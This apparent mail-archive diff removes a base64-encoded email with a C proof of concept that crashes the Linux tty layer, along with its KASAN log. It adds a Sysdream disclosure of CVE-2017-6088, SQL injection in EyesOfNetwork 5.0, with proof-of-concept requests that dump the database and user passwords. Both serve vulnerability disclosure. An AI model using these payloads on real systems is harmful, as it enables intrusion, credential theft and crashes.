-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI1gYGANCg0KaGVyZSBpcyBteSBQT0Ms
-IGl0IHdpbGwgcXVpY2tseSB0cmlnZ2VyIGl0IG9uIDQgU01QIENQVQ0K4oCN
-YGBgDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8YXNzZXJ0Lmg+
-DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxsaW51eC9mdXRleC5o
-PiAvKiBEZWZpbml0aW9uIG9mIEZVVEVYXyogY29uc3RhbnRzICovDQojaW5j
-bHVkZSA8cHRocmVhZC5oPg0KI2luY2x1ZGUgPHB0eS5oPg0KI2luY2x1ZGUg
-PHNjaGVkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRs
-aWIuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy9z
-eXNjYWxsLmg+IC8qIERlZmluaXRpb24gb2YgU1lTXyogY29uc3RhbnRzICov
-DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCnZvaWQqIHdvcmtlcjEodm9pZCog
-YXJnKQ0Kew0KICAgIC8vcHJpbnRmKCJ3b3JrZXIxXG4iKTsNCiAgICBpbnQg
-ZmRfcHRzID0gKGludClhcmc7DQogICAgZm9yIChpbnQgaSA9IDA7IGkgPCA0
-MDk2OyBpKyspIHsNCiAgICAgICAgY2hhciBDID0gODsNCiAgICAgICAgYXNz
-ZXJ0KGlvY3RsKGZkX3B0cywgVElPQ1NUSSwgJkMpID09IDApOw0KICAgIH0N
-CiAgICAvL3ByaW50Zigid29ya2VyMSBEb25lXG4iKTsNCn0NCg0Kdm9pZCog
-d29ya2VyMih2b2lkKiBhcmcpDQp7DQogICAgLy9wcmludGYoIndvcmtlcjJc
-biIpOw0KICAgIGludCBmZF9wdHMgPSAoaW50KWFyZzsNCiAgICBmb3IgKGlu
-dCBpID0gMDsgaSA8IDQwOTY7IGkrKykgew0KICAgICAgICBhc3NlcnQoaW9j
-dGwoZmRfcHRzLCBUQ1hPTkMsIFRDSU9GRikgPT0gMCk7DQogICAgfQ0KICAg
-IC8vcHJpbnRmKCJ3b3JrZXIyIERvbmVcbiIpOw0KfQ0KDQp2b2lkIGV4ZWN1
-dGVfb25lKHZvaWQpDQp7DQogICAgaW50IGZkX3B0bXggPSBvcGVuKCIvZGV2
-L3B0bXgiLCAwLCAwKTsNCg0KICAgIGludCBhcmcgPSAwOw0KICAgIGlvY3Rs
-KGZkX3B0bXgsIFRJT0NTUFRMQ0ssICZhcmcpOw0KICAgIGludCBmZF9wdHMg
-PSBpb2N0bChmZF9wdG14LCBUSU9DR1BUUEVFUiwgMCk7DQoNCiAgICBpb2N0
-bChmZF9wdHMsIFRJT0NTQ1RUWSwgMCk7DQogICAgLy9wZXJyb3IoInRpb2Nz
-Y3R0eSIpOw0KDQogICAgcHRocmVhZF90IHRoMSwgdGgyOw0KICAgIHB0aHJl
-YWRfY3JlYXRlKCZ0aDEsIE5VTEwsIHdvcmtlcjEsIGZkX3B0cyk7DQogICAg
-cHRocmVhZF9jcmVhdGUoJnRoMiwgTlVMTCwgd29ya2VyMiwgZmRfcHRzKTsN
-Cg0KICAgIHB0aHJlYWRfam9pbih0aDEsIE5VTEwpOw0KICAgIHB0aHJlYWRf
-am9pbih0aDIsIE5VTEwpOw0KfQ0KDQp2b2lkIGNoaWxkKHZvaWQpDQp7DQog
-ICAgd2hpbGUgKDEpIHsNCiAgICAgICAgaWYoZm9yaygpPT0wKXsNCiAgICAg
-ICAgICAgIGludCByZXMgPSBzZXRzaWQoKTsNCiAgICAgICAgICAgIGV4ZWN1
-dGVfb25lKCk7DQogICAgICAgICAgICBleGl0KDApOw0KICAgICAgICB9DQog
-ICAgICAgIHdhaXQoTlVMTCk7DQogICAgfQ0KfQ0KDQppbnQgbWFpbih2b2lk
-KQ0Kew0KICAgIGludCBOUFJPQyA9IHN5c2NvbmYoX1NDX05QUk9DRVNTT1JT
-X0NPTkYpOw0KICAgIHByaW50ZigiTlBST0M6ICVkXG4iLCBOUFJPQyk7DQog
-ICAgZm9yIChpbnQgaSA9IDA7IGkgPCBOUFJPQzsgaSsrKSB7DQogICAgICAg
-IGlmIChmb3JrKCkgPT0gMCkgew0KICAgICAgICAgICAgY2hpbGQoKTsNCiAg
-ICAgICAgICAgIGV4aXQoMCk7DQogICAgICAgIH0NCiAgICB9DQogICAgc2xl
-ZXAoMTAgKiA2MCk7DQp9DQrigI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI1gYGANCg0KaGVy
-ZSBpcyBteSBjcmFzaCBleGFtcGxlDQrigI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI1gYGANClsg
-MjU1NS42Njk0MTNdDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClsgMjU1NS42
-NzAwMzldIEJVRzogS0FTQU46IHNsYWItb3V0LW9mLWJvdW5kcyBpbg0Kbl90
-dHlfcmVjZWl2ZV9idWZfY29tbW9uKzB4MTI2Mi8weDQzODANClsgMjU1NS42
-NzAwMzldIFJlYWQgb2Ygc2l6ZSA0MDg2IGF0IGFkZHIgZmZmZjg4ODExYjQy
-MTAyYSBieSB0YXNrDQprd29ya2VyL3UxNjo1LzE3MQ0KWyAyNTU1LjY3MDAz
-OV0NClsgMjU1NS42NzAwMzldIENQVTogMiBQSUQ6IDE3MSBDb21tOiBrd29y
-a2VyL3UxNjo1IE5vdCB0YWludGVkIDUuMTguMC1yYzEgIzUNClsgMjU1NS42
-NzAwMzldIEhhcmR3YXJlIG5hbWU6IFFFTVUgU3RhbmRhcmQgUEMgKGk0NDBG
-WCArIFBJSVgsIDE5OTYpLCBCSU9TDQoxLjEzLjAtMXVidW50NA0KWyAyNTU1
-LjY3MDAzOV0gV29ya3F1ZXVlOiBldmVudHNfdW5ib3VuZCBmbHVzaF90b19s
-ZGlzYw0KWyAyNTU1LjY3MDAzOV0gQ2FsbCBUcmFjZToNClsgMjU1NS42NzAw
-MzldICA8VEFTSz4NClsgMjU1NS42NzAwMzldICBkdW1wX3N0YWNrX2x2bCsw
-eDRkLzB4NjYNClsgMjU1NS42NzAwMzldICBwcmludF9yZXBvcnQuY29sZCsw
-eGIyLzB4NmI3DQpbIDI1NTUuNjcwMDM5XSAgPyBuX3R0eV9yZWNlaXZlX2J1
-Zl9jb21tb24rMHgxMjYyLzB4NDM4MA0KWyAyNTU1LjY3MDAzOV0gIGthc2Fu
-X3JlcG9ydCsweGE5LzB4MTIwDQpbIDI1NTUuNjcwMDM5XSAgPyBuX3R0eV9y
-ZWNlaXZlX2J1Zl9jb21tb24rMHgxMjYyLzB4NDM4MA0KWyAyNTU1LjY3MDAz
-OV0gIGthc2FuX2NoZWNrX3JhbmdlKzB4MTRkLzB4MWQwDQpbIDI1NTUuNjcw
-MDM5XSAgbWVtY3B5KzB4MjAvMHg2MA0KWyAyNTU1LjY3MDAzOV0gIG5fdHR5
-X3JlY2VpdmVfYnVmX2NvbW1vbisweDEyNjIvMHg0MzgwDQpbIDI1NTUuNjcw
-MDM5XSAgPyBzZWxlY3RfdGFza19ycV9mYWlyKzB4M2NmLzB4MmY4MA0KWyAy
-NTU1LjY3MDAzOV0gID8gbGRzZW1fZG93bl9yZWFkX3RyeWxvY2srMHhkNi8w
-eDE0MA0KWyAyNTU1LjY3MDAzOV0gID8gX19pbml0X2xkc2VtKzB4MTcwLzB4
-MTcwDQpbIDI1NTUuNjcwMDM5XSAgPyBvc3FfdW5sb2NrKzB4MWQwLzB4MWQw
-DQpbIDI1NTUuNjcwMDM5XSAgdHR5X2xkaXNjX3JlY2VpdmVfYnVmKzB4YTYv
-MHgxOTANClsgMjU1NS42NzAwMzldICA/IG5fdHR5X3JlY2VpdmVfYnVmX2Nv
-bW1vbisweDQzODAvMHg0MzgwDQpbIDI1NTUuNjcwMDM5XSAgdHR5X3BvcnRf
-ZGVmYXVsdF9yZWNlaXZlX2J1ZisweDZlLzB4YTANClsgMjU1NS42NzAwMzld
-ICBmbHVzaF90b19sZGlzYysweDFlYi8weDNlMA0KWyAyNTU1LjY3MDAzOV0g
-IHByb2Nlc3Nfb25lX3dvcmsrMHg4NjYvMHgxMWQwDQpbIDI1NTUuNjcwMDM5
-XSAgd29ya2VyX3RocmVhZCsweDU0OS8weDExMzANClsgMjU1NS42NzAwMzld
-ICA/IHByb2Nlc3Nfb25lX3dvcmsrMHgxMWQwLzB4MTFkMA0KWyAyNTU1LjY3
-MDAzOV0gIGt0aHJlYWQrMHgyODgvMHgzMzANClsgMjU1NS42NzAwMzldICA/
-IGt0aHJlYWRfY29tcGxldGVfYW5kX2V4aXQrMHg0MC8weDQwDQpbIDI1NTUu
-NjcwMDM5XSAgcmV0X2Zyb21fZm9yaysweDIyLzB4MzANClsgMjU1NS42NzAw
-MzldICA8L1RBU0s+DQpbIDI1NTUuNjcwMDM5XQ0KWyAyNTU1LjY4MjE4OF0g
-QWxsb2NhdGVkIGJ5IHRhc2sgMzAyMTA6DQpbIDI1NTUuNjgyMTg4XSAga2Fz
-YW5fc2F2ZV9zdGFjaysweDFlLzB4NDANClsgMjU1NS42ODIxODhdICBfX2th
-c2FuX2ttYWxsb2MrMHg4MS8weGEwDQpbIDI1NTUuNjgyMTg4XSAgX190dHlf
-YnVmZmVyX3JlcXVlc3Rfcm9vbSsweDFhNi8weDU2MA0KWyAyNTU1LjY4MjE4
-OF0gIHR0eV9pbnNlcnRfZmxpcF9zdHJpbmdfZml4ZWRfZmxhZysweDhjLzB4
-MWMwDQpbIDI1NTUuNjgyMTg4XSAgcHR5X3dyaXRlKzB4MTBkLzB4MWQwDQpb
-IDI1NTUuNjgyMTg4XSAgdHR5X3B1dF9jaGFyKzB4MTI5LzB4MTUwDQpbIDI1
-NTUuNjgyMTg4XSAgX19wcm9jZXNzX2VjaG9lcysweDQ4OS8weDhjMA0KWyAy
-NTU1LjY4MjE4OF0gIG5fdHR5X3JlY2VpdmVfYnVmX2NvbW1vbisweGJkNi8w
-eDQzODANClsgMjU1NS42ODIxODhdICB0dHlfaW9jdGwrMHg0NjgvMHgxMmMw
-DQpbIDI1NTUuNjgyMTg4XSAgX194NjRfc3lzX2lvY3RsKzB4MTcwLzB4MWQw
-DQpbIDI1NTUuNjgyMTg4XSAgZG9fc3lzY2FsbF82NCsweDNiLzB4OTANClsg
-MjU1NS42ODIxODhdICBlbnRyeV9TWVNDQUxMXzY0X2FmdGVyX2h3ZnJhbWUr
-MHg0NC8weGFlDQpbIDI1NTUuNjgyMTg4XQ0KWyAyNTU1LjY4MjE4OF0gTGFz
-dCBwb3RlbnRpYWxseSByZWxhdGVkIHdvcmsgY3JlYXRpb246DQpbIDI1NTUu
-NjgyMTg4XSAga2FzYW5fc2F2ZV9zdGFjaysweDFlLzB4NDANClsgMjU1NS42
-ODIxODhdICBfX2thc2FuX3JlY29yZF9hdXhfc3RhY2srMHg5Ny8weGEwDQpb
-IDI1NTUuNjgyMTg4XSAgaW5zZXJ0X3dvcmsrMHg0Ni8weDMzMA0KWyAyNTU1
-LjY4NzcxOF0gIF9fcXVldWVfd29yaysweDNkYi8weGNiMA0KWyAyNTU1LjY4
-NzcxOF0gIHF1ZXVlX3dvcmtfb24rMHg2NC8weDcwDQpbIDI1NTUuNjg3NzE4
-XSAgcmVsZWFzZV90dHkrMHg0ODgvMHg1YzANClsgMjU1NS42ODc3MThdICB0
-dHlfcmVsZWFzZV9zdHJ1Y3QrMHgzNS8weDUwDQpbIDI1NTUuNjg3NzE4XSAg
-dHR5X3JlbGVhc2UrMHhhOGQvMHhkNjANClsgMjU1NS42ODc3MThdICBfX2Zw
-dXQrMHgyMWUvMHg5NDANClsgMjU1NS42ODc3MThdICB0YXNrX3dvcmtfcnVu
-KzB4ZTEvMHgxODANClsgMjU1NS42ODkyNTBdICBleGl0X3RvX3VzZXJfbW9k
-ZV9wcmVwYXJlKzB4MTFjLzB4MTIwDQpbIDI1NTUuNjg5MjUwXSAgc3lzY2Fs
-bF9leGl0X3RvX3VzZXJfbW9kZSsweDFkLzB4NDANClsgMjU1NS42ODkyNTBd
-ICBkb19zeXNjYWxsXzY0KzB4NDgvMHg5MA0KWyAyNTU1LjY5MDAxOF0gIGVu
-dHJ5X1NZU0NBTExfNjRfYWZ0ZXJfaHdmcmFtZSsweDQ0LzB4YWUNClsgMjU1
-NS42OTAwMThdDQpbIDI1NTUuNjkwMDE4XSBTZWNvbmQgdG8gbGFzdCBwb3Rl
-bnRpYWxseSByZWxhdGVkIHdvcmsgY3JlYXRpb246DQpbIDI1NTUuNjkwMDE4
-XSAga2FzYW5fc2F2ZV9zdGFjaysweDFlLzB4NDANClsgMjU1NS42OTAwMThd
-ICBfX2thc2FuX3JlY29yZF9hdXhfc3RhY2srMHg5Ny8weGEwDQpbIDI1NTUu
-NjkwMDE4XSAgaW5zZXJ0X3dvcmsrMHg0Ni8weDMzMA0KWyAyNTU1LjY5MDAx
-OF0gIF9fcXVldWVfd29yaysweDNkYi8weGNiMA0KWyAyNTU1LjY5MDAxOF0g
-IHF1ZXVlX3dvcmtfb24rMHg2NC8weDcwDQpbIDI1NTUuNjkwMDE4XSAgcmVs
-ZWFzZV90dHkrMHg0OWEvMHg1YzANClsgMjU1NS42OTAwMThdICB0dHlfcmVs
-ZWFzZV9zdHJ1Y3QrMHgzNS8weDUwDQpbIDI1NTUuNjkwMDE4XSAgdHR5X3Jl
-bGVhc2UrMHhhOGQvMHhkNjANClsgMjU1NS42OTAwMThdICBfX2ZwdXQrMHgy
-MWUvMHg5NDANClsgMjU1NS42OTAwMThdICB0YXNrX3dvcmtfcnVuKzB4ZTEv
-MHgxODANClsgMjU1NS42OTAwMThdICBleGl0X3RvX3VzZXJfbW9kZV9wcmVw
-YXJlKzB4MTFjLzB4MTIwDQpbIDI1NTUuNjkwMDE4XSAgc3lzY2FsbF9leGl0
-X3RvX3VzZXJfbW9kZSsweDFkLzB4NDANClsgMjU1NS42OTAwMThdICBkb19z
-eXNjYWxsXzY0KzB4NDgvMHg5MA0KWyAyNTU1LjY5MDAxOF0gIGVudHJ5X1NZ
-U0NBTExfNjRfYWZ0ZXJfaHdmcmFtZSsweDQ0LzB4YWUNClsgMjU1NS42OTAw
-MThdDQpbIDI1NTUuNjkwMDE4XSBUaGUgYnVnZ3kgYWRkcmVzcyBiZWxvbmdz
-IHRvIHRoZSBvYmplY3QgYXQgZmZmZjg4ODExYjQyMTAwMA0KWyAyNTU1LjY5
-MDAxOF0gIHdoaWNoIGJlbG9uZ3MgdG8gdGhlIGNhY2hlIGttYWxsb2MtMWsg
-b2Ygc2l6ZSAxMDI0DQpbIDI1NTUuNjkwMDE4XSBUaGUgYnVnZ3kgYWRkcmVz
-cyBpcyBsb2NhdGVkIDQyIGJ5dGVzIGluc2lkZSBvZg0KWyAyNTU1LjY5MDAx
-OF0gIDEwMjQtYnl0ZSByZWdpb24gW2ZmZmY4ODgxMWI0MjEwMDAsIGZmZmY4
-ODgxMWI0MjE0MDApDQpbIDI1NTUuNjkwMDE4XQ0KWyAyNTU1LjY5MDAxOF0g
-VGhlIGJ1Z2d5IGFkZHJlc3MgYmVsb25ncyB0byB0aGUgcGh5c2ljYWwgcGFn
-ZToNClsgMjU1NS42OTAwMThdIHBhZ2U6MDAwMDAwMDBkNGU0M2JlNSByZWZj
-b3VudDoxIG1hcGNvdW50OjANCm1hcHBpbmc6MDAwMDAwMDAwMDAwMDAwMCBp
-bmRlMA0KWyAyNTU1LjY5MDAxOF0gaGVhZDowMDAwMDAwMGQ0ZTQzYmU1IG9y
-ZGVyOjMgY29tcG91bmRfbWFwY291bnQ6MA0KY29tcG91bmRfcGluY291bnQ6
-MA0KWyAyNTU1LjY5MDAxOF0gZmxhZ3M6IDB4MjAwMDAwMDAwMDEwMjAwKHNs
-YWJ8aGVhZHxub2RlPTB8em9uZT0yKQ0KWyAyNTU1LjY5MDAxOF0gcmF3OiAw
-MjAwMDAwMDAwMDEwMjAwIGRlYWQwMDAwMDAwMDAxMDAgZGVhZDAwMDAwMDAw
-MDEyMg0KZmZmZjg4ODEwMDA0MmRjMA0KWyAyNTU1LjY5MDAxOF0gcmF3OiAw
-MDAwMDAwMDAwMDAwMDAwIDAwMDAwMDAwODAxMDAwMTAgMDAwMDAwMDFmZmZm
-ZmZmZg0KMDAwMDAwMDAwMDAwMDAwMA0KWyAyNTU1LjY5MDAxOF0gcGFnZSBk
-dW1wZWQgYmVjYXVzZToga2FzYW46IGJhZCBhY2Nlc3MgZGV0ZWN0ZWQNClsg
-MjU1NS42OTAwMThdDQpbIDI1NTUuNjkwMDE4XSBNZW1vcnkgc3RhdGUgYXJv
-dW5kIHRoZSBidWdneSBhZGRyZXNzOg0KWyAyNTU1LjY5MDAxOF0gIGZmZmY4
-ODgxMWI0MjExMDA6IDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAw
-IDAwIDAwIDAwDQowMCAwMA0KWyAyNTU1LjY5MDAxOF0gIGZmZmY4ODgxMWI0
-MjExODA6IDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAw
-IDAwDQowMCAwMA0KWyAyNTU1LjY5MDAxOF0gPmZmZmY4ODgxMWI0MjEyMDA6
-IDAwIDAwIDAwIDAwIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjDQpm
-YyBmYw0KWyAyNTU1LjY5MDAxOF0gICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgIF4NClsgMjU1NS42OTAwMThdICBmZmZmODg4MTFiNDIxMjgwOiBm
-YyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYw0KZmMg
-ZmMNClsgMjU1NS42OTAwMThdICBmZmZmODg4MTFiNDIxMzAwOiBmYyBmYyBm
-YyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYw0KZmMgZmMNClsg
-MjU1NS42OTAwMThdDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClsgMjU1NS43
-MDQxMTBdIERpc2FibGluZyBsb2NrIGRlYnVnZ2luZyBkdWUgdG8ga2VybmVs
-IHRhaW50DQrigI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3igI3i
-gI3igI3igI1gYGANCg0KRW5nbGlzaCBpcyBub3QgbXkgbmF0aXZlIGxhbmd1
-YWdlLCBwbGVhc2UgZm9yZ2l2ZSBtZQ0K
+--84WPGhW89HW1Wh86w23BP9JWV3riVGkti
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
---000000000000fa2a0905dfff61ed--
+# [CVE-2017-6088] EON 5.0 Multiple SQL Injection
+
+## Description
+
+EyesOfNetwork ("EON") is an OpenSource network monitoring solution.
+
+## SQL injection (authenticated)
+
+The Eonweb code does not correctly filter arguments, allowing
+authenticated users to inject arbitrary SQL requests.
+
+**CVE ID**: CVE-2017-6088
+
+**Access Vector**: remote
+
+**Security Risk**: medium
+
+**Vulnerability**: CWE-89
+
+**CVSS Base Score**: 6.0
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L
+
+### Proof of Concept 1 (root privileges)
+
+The following HTTP request allows an attacker (connected as
+administrator) to dump the database contents using SQL injections inside
+either the `bp_name` or the `display` parameter. These requests are
+executed with MySQL root privileges.
+
+```
+https://eonweb.local/module/admin_bp/php/function_bp.php?action=3Dlist_proc=
+ess&bp_name=3D&display=3D%27or%271%27=3D%271
+
+https://eonweb.local/module/admin_bp/php/function_bp.php?action=3Dlist_proc=
+ess&bp_name=3D%27or%271%27=3D%271&display=3D1
+```
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ged_functions.php` file, line 114:
+
+```
+function list_process($bp,$display,$bdd){
+    $sql =3D "select name from bp where is_define =3D 1 and name!=3D'".$bp.=
+"'
+and priority =3D '" . $display . "'";
+    $req =3D $bdd->query($sql);
+    $process =3D $req->fetchall();
+
+    echo json_encode($process);
+}
+```
+
+### Proof of Concept 2
+
+The following HTTP request allows an attacker to dump the database
+contents using SQL injections inside the `type` parameter:
+
+```
+https://eonweb.local/module/monitoring_ged/ajax.php?queue=3Dactive&type=3D1=
+%27+AND+(SELECT+sleep(5))+AND+%271%27=3D%271&owner=3D&filter=3Dequipment&se=
+arch=3D&ok=3Don&warning=3Don&critical=3Don&unknown=3Don&daterange=3D&time_p=
+eriod=3D&ack_time=3D
+```
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ajax.php` file, line 64:
+
+```
+if($_GET["type"] =3D=3D 0){
+  $ged_where =3D "WHERE pkt_type_id!=3D'0'";
+} else {
+  $ged_where =3D "WHERE pkt_type_id=3D'".$_GET["type"]."'";
+}
+$gedsql_result1=3Dsqlrequest($database_ged,"SELECT
+pkt_type_id,pkt_type_name FROM pkt_type $ged_where AND pkt_type_id<'100';");
+```
+
+### Proof of Concept 3
+
+The following HTTP request allows an attacker to dump the database
+contents using SQL injections inside the `search` parameter:
+
+```
+https://eonweb.local/module/monitoring_ged/ajax.php?queue=3Dactive&type=3D1=
+&owner=3D&filter=3Dequipment&search=3D'+AND+(select+sleep(5))+AND+'1'=3D'1&=
+ok=3Don&warning=3Don&critical=3Don&unknown=3Don&daterange=3D&time_period=3D=
+&ack_time=3D
+```
+
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ged_functions.php` file, line 129.
+
+```
+if($search !=3D ""){
+    $like =3D "";
+    if( substr($search, 0, 1) =3D=3D=3D '*' ){
+        $like .=3D "%";
+    }
+    $like .=3D trim($search, '*');
+    if ( substr($search, -1) =3D=3D=3D '*' ) {
+        $like .=3D "%";
+    }
+
+    $where_clause .=3D " AND $filter LIKE '$like'";
+}
+```
+
+
+### Proof of Concept 4
+
+The following HTTP request allows an attacker to dump the database
+contents using SQL injections inside the `equipment` parameter:
+
+```
+https://eonweb.local/module/monitoring_ged/ged_actions.php?action=3Dadvance=
+dFilterSearch&filter=3D(select+user_passwd+from+eonweb.users+limit
+1)&queue=3Dhistory
+```
+
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ged_functions.php` file, line 493:
+
+```
+$gedsql_result1=3Dsqlrequest($database_ged,"SELECT
+pkt_type_id,pkt_type_name FROM pkt_type WHERE pkt_type_id!=3D'0' AND
+pkt_type_id<'100';");
+
+
+while($ged_type =3D mysqli_fetch_assoc($gedsql_result1)){
+    $sql =3D "SELECT DISTINCT $filter FROM
+".$ged_type["pkt_type_name"]."_queue_".$queue;
+
+    $results =3D sqlrequest($database_ged, $sql);
+    while($result =3D mysqli_fetch_array($results)){
+        if( !in_array($result[$filter], $datas) && $result[$filter] !=3D ""=
+ ){
+            array_push($datas, $result[$filter]);
+        }
+    }
+}
+```
+
+
+## Timeline (dd/mm/yyyy)
+
+* 01/10/2016 : Initial discovery.
+* 09/10/2016 : Fisrt contact with vendor.
+* 23/10/2016 : Technical details sent to the security contact.
+* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
+* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
+* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
+repsonsible disclosure agreement.
+* 14/03/2017 : Public disclosure.
+
+Thank you to EON for the fast response.
+
+## Solution
+
+Update to version 5.1.
+
+## Affected versions
+
+* Version <=3D 5.0
+
+## Credits
+
+* Nicolas SERRA <n.serra@sysdream.com>
+
+--=20
+SYSDREAM Labs <labs@sysdream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+
+--84WPGhW89HW1Wh86w23BP9JWV3riVGkti--
+
+--NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIvBAEBCAAZBQJY0+fsEhxsYWJzQHN5c2RyZWFtLmNvbQAKCRCOtIzZ1bJZoRvQ
+D/9brShPFFzDTskjoyJKPgMRNzdnOWH6JKBvYkhFcJltzqs7DzeMH4siSpO/86UH
+I5KxLWuGATZwf75gQ6TVZ03e4/kPFEpnlL4l/O7jO2vgtgrV9B9Af8iXJdsGG30j
+FFp87bZo5J/5qg+zdJBHMkhzPoU6RB9bFUHKgxlNjfEqYQ/ekGW3/4W0Z5khtSq4
+hk/8PAGa5pMdKdghidOFrsnF14cLkuRgaSyTtZILdlAYAhIlonwQ4W/xfEhuf1gg
+1JWKt9Yx+rmb1s/E+2l5Mf4DEhCTbhdviHw0aEF5BSupCJpLXRRGiwn/HLz9aGnB
+S1lclWK0+IyqUTTxC7wTyyXagGSXgBzAe7qguktkmdGKcREkpBDJhIRUHcSZJ+7x
+41LHnmiclJBCWriyD6DnfEgCGMG49J7dOWz+APJAQKXZeyW28j9+snlLPTpNAw89
+MFEuZQiUepcWD/7ctp1+qQgPwdVsCR/SnNvdALNFHqd8Nuh7ty7iGOiZTFEmO5Fv
+TYdUEYI80I+ibUnRVaNDTIR9aE71Qcp0cOHpoL/L0rlxdhf582IlZ0o1c47z9vx1
+7Q/8qsPvkeR/Ffzc+uNeVJP3o6VZbl5q6gHfZLljU2n9S9bKffd4kZgADrpkr0bV
+196s1rIYb8jedUhd85JNEQrJr+DSiP2lmlYBo8VSCLHe+Q==
+=bhV5
+-----END PGP SIGNATURE-----
+
+--NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8--
